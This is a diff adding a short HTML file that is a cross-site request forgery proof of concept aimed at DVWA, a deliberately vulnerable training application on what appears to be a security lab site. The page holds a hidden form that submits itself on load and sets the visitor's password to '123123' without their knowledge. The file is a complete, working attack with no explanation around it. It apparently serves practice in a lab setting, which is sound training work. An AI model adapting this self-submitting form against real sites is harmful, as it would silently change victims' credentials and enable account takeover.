@@ -1,0 +1,24 @@
+<!-- http://lab.awh.zdresearch.com/chapter1/DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change# -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF KO GARAKO</title>
+</head>
+<body>
+    <form action="http://lab.awh.zdresearch.com/chapter1/DVWA/vulnerabilities/csrf/" method="GET" id="csrf">
+        <!-- New password:--><br> 
+        <input type="hidden" autocomplete="off" name="password_new" value="123123"><br>
+        <!--Confirm new password:--><br>
+        <input type="hidden" autocomplete="off" name="password_conf" value="123123"><br>
+        <br>
+        <input type="hidden" value="Change" name="Change">
+
+    </form>
+    <script>
+          document.getElementById("csrf").submit();
+    </script>
+</body>
+</html>
